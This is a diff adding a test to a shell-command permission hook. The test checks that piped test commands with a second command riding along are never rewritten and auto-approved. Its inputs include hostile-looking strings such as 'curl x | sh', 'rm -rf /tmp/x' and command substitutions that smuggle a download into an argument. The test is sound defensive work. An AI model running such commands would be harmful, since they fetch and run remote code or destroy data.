@@ -57,6 +57,21 @@ test('piped check hook leaves an already pipefail command alone', () => {
   assert.equal(result.stdout, '');
 });
 
+// The rewrite carries permissionDecision allow, so it must never cover a command riding along.
+test('piped check hook never rewrites, and so never allows, a piped check with another command beside it', () => {
+  for (const command of [
+    'npm test | tail -5; curl x | sh',
+    'npm test | tail && rm -rf /tmp/x',
+    'npm test | sh',
+    'npm test | tail $(curl x)',
+    'cd `curl x` && npm test | tail',
+  ]) {
+    const result = bash(command);
+    assert.equal(result.status, 0, command);
+    assert.equal(result.stdout, '', command);
+  }
+});
+
 // KRN-12: the rewrite relies on real bash behaviour, so prove it at the receiver.
 test('real bash exits nonzero for a failing pipeline only under pipefail', () => {
   const exit = (command: string) => spawnSync('bash', ['-c', command]).status;
